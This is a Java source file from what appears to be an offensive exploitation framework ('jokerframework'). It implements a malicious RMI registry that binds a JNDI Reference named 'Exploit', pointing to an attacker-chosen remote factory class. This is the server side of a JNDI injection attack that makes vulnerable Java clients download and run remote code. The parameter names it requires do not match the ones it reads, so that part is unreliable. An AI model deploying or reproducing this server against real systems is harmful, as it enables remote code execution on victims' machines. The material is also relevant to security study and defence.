package com.lucifaer.jokerframework.joker.server;

import com.lucifaer.jokerframework.sdk.context.ShellContext;
import com.lucifaer.jokerframework.joker.core.server.BaseServer;
import com.lucifaer.jokerframework.joker.core.server.Server;
import com.lucifaer.jokerframework.joker.core.shell.ShellThrowableHandler;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.Map;

/**
 * RmiServer为rmi服务的具体实现类
 * @author Lucifaer
 * @version 3.0
 */
@Component
@Scope("prototype")
public class RmiServer extends BaseServer implements Server {
    private final ShellThrowableHandler shellThrowableHandler;
    private Registry registry;

    private static final String defaultUrl = "0.0.0.0";
    private static final String defaultPort = "2000";

    public RmiServer(ShellThrowableHandler shellThrowableHandler) {
        this.shellThrowableHandler = shellThrowableHandler;
        this.serverName = "rmi-server";
        this.serverUrl = defaultUrl;
        this.serverPort = defaultPort;
        this.requiredParams.add("remote_className");
        this.requiredParams.add("remote_factoryName");
        this.requiredParams.add("remote_factoryLocation");
    }

    @Override
    public void createServer(ShellContext shellContext) {
        Map<String, String> shellParams = shellContext.getParams();

        try {
            registry = LocateRegistry.createRegistry(Integer.parseInt(serverPort));
            Reference reference = generateReference(shellParams);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.rebind("Exploit", referenceWrapper);
        } catch (Exception e) {
            shellThrowableHandler.handleThrowable(e);
        }
    }

    @Override
    public void stopServer() {
        try {
            Naming.unbind("rmi://" + serverUrl + ":" + serverPort + "/Exploit");
            UnicastRemoteObject.unexportObject(registry, true);
        } catch (Exception e) {
            shellThrowableHandler.handleThrowable(e);
        }
    }

    private Reference generateReference(Map<String, String> params) {
        String className = params.get("rmi_className");
        String factoryName = params.get("rmi_factoryName");
        String factoryLocation = params.get("rmi_factoryLocation");
        try {
            return new Reference(className, factoryName, factoryLocation);
        } catch (Exception e) {
            shellThrowableHandler.handleThrowable(e);
        }
        return null;
    }
}
